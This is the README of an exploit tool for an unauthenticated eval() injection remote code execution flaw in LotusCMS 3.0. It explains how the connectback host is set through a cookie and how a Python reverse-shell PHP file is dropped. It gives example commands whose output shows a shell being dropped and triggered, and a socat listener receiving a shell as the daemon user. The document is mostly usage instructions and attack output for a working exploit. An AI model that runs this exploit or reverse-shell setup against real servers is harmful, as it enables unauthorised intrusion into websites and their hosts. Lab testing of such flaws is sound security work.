# Exploit for OSVDB-75095, LotusCMS 3.0 Unauthenticated Remote Code Execution

This is an exploit for the eval() injection vulnerability found ages ago in LotusCMS. Very quick and dirty exploit, written to test out some new ideas I had for writing more streamlined PHP RCE exploits, in this case, using the cookie to set the connectback host/port at runtime when doing a filedropper type thing. I ended up storing the payload itself in a POST variable, as storing it in the cookie lead to some strange encoding issues. See the code for what I mean. The reason for writing this was to have a reliable "playground" in which to test ideas, and it is going to probably be an evolving piece of work.

## Usage

To use, simply select which payload you want to use (currently only back_python.php is available, but I plan on adding back_php.php and back_perl.php at a later date). This is the "payload.php". You also must specify a callback host and port, along with the URL to the vulnerable LotusCMS installation.

Example Use:
```
xrl:~$ python lucky_lotus.py http://192.168.2.118/lcms back_python.php 192.168.2.120 31337

    ▄█       ███    █▄   ▄████████    ▄█   ▄█▄ ▄██   ▄        
   ███       ███    ███ ███    ███   ███ ▄███▀ ███   ██▄      
   ███       ███    ███ ███    █▀    ███▐██▀   ███▄▄▄███      
   ███       ███    ███ ███         ▄█████▀    ▀▀▀▀▀▀███      
   ███       ███    ███ ███        ▀▀█████▄    ▄██   ███      
   ███       ███    ███ ███    █▄    ███▐██▄   ███   ███      
   ███▌    ▄ ███    ███ ███    ███   ███ ▀███▄ ███   ███      
   █████▄▄██ ████████▀  ████████▀    ███   ▀█▀  ▀█████▀       
   ▀                                 ▀                        
  ▄█        ▄██████▄      ███     ███    █▄     ▄████████   
 ███       ███    ███ ▀█████████▄ ███    ███   ███    ███   
 ███       ███    ███    ▀███▀▀██ ███    ███   ███    █▀    
 ███       ███    ███     ███   ▀ ███    ███   ███          
 ███       ███    ███     ███     ███    ███ ▀███████████   
 ███       ███    ███     ███     ███    ███          ███   
 ███▌    ▄ ███    ███     ███     ███    ███    ▄█    ███   
 █████▄▄██  ▀██████▀     ▄████▀   ████████▀   ▄████████▀    
 ▀                                                            
  Exploit for LotusCMS, OSVDB-75095 Version: 20150306.1
{+} Sending our payload...
{+} Using 192.168.2.120:31337 as callback...
{+} Dropping shell...
{+} Shell dropped... Triggering...
{+} got shell?
xrl:~$ 
```

For a listener, I suggest using socat, as per the following example, as it allows a full PTY to be spawned (at least with the reference Python payload).
```
xrl:~$ socat -,echo=0,raw tcp4-listen:31337
Got root yet?
Linux HACKME 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:43:14 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@HACKME:/opt/lampp/htdocs/lcms$ exit
exit
quitting, cleanup
xrl:~$ 
```

## Demo
If you want, check out the [Asciicast demo][asciicast]  
[![asciicast](https://asciinema.org/a/17327.png)](https://asciinema.org/a/17327)

## Licence
Licenced under the [WTFPL][wtfpl]

[asciicast]: https://asciinema.org/a/17327
[wtfpl]: http://www.wtfpl.net/
